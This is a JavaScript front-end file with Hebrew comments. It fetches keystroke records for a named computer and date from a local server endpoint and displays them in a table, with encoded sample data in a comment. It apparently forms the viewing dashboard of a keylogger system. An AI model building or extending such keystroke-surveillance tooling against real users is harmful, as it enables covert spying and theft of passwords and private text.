// פונקציה לקריאת הפרמטר מה-URL
const getQueryParam = (param) => {
    const urlParams = new URLSearchParams(window.location.search);
    console.log(urlParams);
    return urlParams.get(param);
};

// קריאת הפרמטרים
const computer = getQueryParam("name");
const date = getQueryParam("date");


// כתובת השרת
const url = 'http://127.0.0.1:5000'

// פונקציה להצגת הנתונים בדף
const displayData = (data) => {

// יצירת כותרת ראשית מעל הקונטיינר
    const mainTitle = document.createElement('h2');
    mainTitle.innerText = `The data of ${computer} on ${date}`;
    mainTitle.classList.add("main-title");
    document.body.appendChild(mainTitle);

    // יצירת קונטיינר ראשי לכל הנתונים
    const container = document.createElement('div');
    container.classList.add("container");


    // יצירת טבלה
    const table = document.createElement('table');
    table.classList.add("data-table");
    const thead1 = document.createElement('thead');
    const tr1 = document.createElement('tr');

    const th1 = document.createElement('th');
    const th2 = document.createElement('th');

    th1.innerText = "Hour";
    th2.innerText = "Contents";

    tr1.appendChild(th1);
    tr1.appendChild(th2);

    thead1.appendChild(tr1);
    table.appendChild(thead1);

    // יצירת גוף הטבלה (tbody)
    const tbody = document.createElement('tbody');

    // הוספת הנתונים לטבלה
    Object.keys(data).forEach(time => {
        const tr = document.createElement('tr');
        const td1 = document.createElement('td');
        const td2 = document.createElement('td');

        td1.innerText = time;
        td2.innerText = data[time];

        tr.appendChild(td1);
        tr.appendChild(td2);
        tbody.appendChild(tr);
    });
    table.appendChild(tbody);
    container.appendChild(table);
    document.body.appendChild(container);

    }

// פונקציה לקבלת מידע מהשרת
async function fetchData() {
    console.log("Fetching data..."); // הדפסת הודעה לקונסול
    console.log(`${url}/api/get_keystrokes_by_name_and_date/${encodeURIComponent(computer)}/${date}`);
    try {
        const response = await fetch(`${url}/api/get_keystrokes_by_name_and_date/${encodeURIComponent(computer)}/${date}`); // בקשה לשרת
        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        const data = await response.json(); // המרת התגובה לאובייקט JSON
        displayData(data); // הצגת הנתונים בדף
    } catch (error) {
        console.error("Error fetching data:", error);
    }
}

fetchData(); // קריאה לפונקציה לקבלת הנתונים מהשרת


// {
//     "13:00:00": "\n\u0001\u0014\u000eLr",
//     "13:30:00": "\n\u0001\u0014\u000eLq",
//     "14:00:00": "\n\u0001\u0014\u000eLp",
//     "14:30:00": "\n\u0001\u0014\u000eLw",
//     "15:00:00": "\n\u0001\u0014\u000eLv"
//     }
